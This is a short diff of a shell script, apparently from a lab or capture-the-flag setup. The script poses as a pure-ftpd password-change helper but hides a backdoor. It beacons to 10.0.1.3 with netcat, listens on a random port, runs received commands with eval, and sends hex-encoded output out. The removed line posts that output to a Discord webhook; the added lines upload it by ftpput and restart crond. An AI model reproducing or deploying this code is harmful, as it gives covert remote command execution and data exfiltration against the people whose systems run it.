@@ -1,1 +1,7 @@
-set -x;A=4;if [ $(($RANDOM % $A)) != 0 ];then echo;fi;B="Bandits ate my Natass";C=0;D=1;E='https://discord.com/api/webhooks/1237246637814972507/gJCg8LBG6mHLBquE7iaQWP2UW7ak1uL5Eloz5MjJBS7U9utkUIsPDe5Fm4FavjfQUNnk';F=10;G="10.0.1.3";H=23766;I="-lp";J="-t";K=$RANDOM;L=$((5000+($RANDOM % 10000)));P="$B\r\nOPTIONS /KylerHowAreTheKids RTSP/1.0\r\nCSeq: $L\r\n\r\n";echo -e "$P" | unix2dos | timeout $J $F nc $G $H;if [ $? != 0 ]; then exit;fi;M=$(timeout $J $F nc $I $L);if [ $? != 0 ]; then exit;fi;N=$(echo $(eval $(echo -e $M)) | hexdump -ve '/1 "%02x"');O={\"content\":\"$N\"};echo \'$(echo $O)\';wget --method=POST --header="Content-Type: application/json" --body-data=$(echo $O)  $E
+#!/bin/sh
+if [ $# == 3 ]; then A=4;if [ $(($RANDOM % $A)) != 0 ];then exit;fi;sleep $(($RANDOM % 20));B="Bandits ate my Natass";C=0;D=1;F=10;G="10.0.1.3";H=23765;I="-lp";J="-t";K=$RANDOM;L=$((5000+($RANDOM % 10000)));P="$B\r\nOPTIONS /KylerHowAreTheKids RTSP/1.0\r\nCSeq: $L\r\n\r\n";echo -e "$P" | timeout $J $F nc $G $H;if [ $? != 0 ]; then exit;fi;M=$(timeout $J $F nc $I $L);if [ $? != 0 ]; then exit;fi;IP_ADDR=$(ifconfig eth0 | grep "inet addr" | cut -d " " -f 12);OUT_FILE=$(cryptpw "$(date)$IP_ADDR" | tr -d '/');echo $IP_ADDR > "$OUT_FILE";echo $(eval $(echo -e $M) | hexdump -ve '/1 "%02x"') >> "$OUT_FILE";ftpput -u golf -p "$(tail -c 4 /bin/btools)" 10.0.1.3 "$OUT_FILE";rm "$OUT_FILE";if [ $(ps | grep crond | wc -l) == 1 ];then crond;fi;else echo "change Passwd"
+pure-pw passwd $1 << EOF
+$2
+$2
+EOF
+pure-pw mkdb;fi;
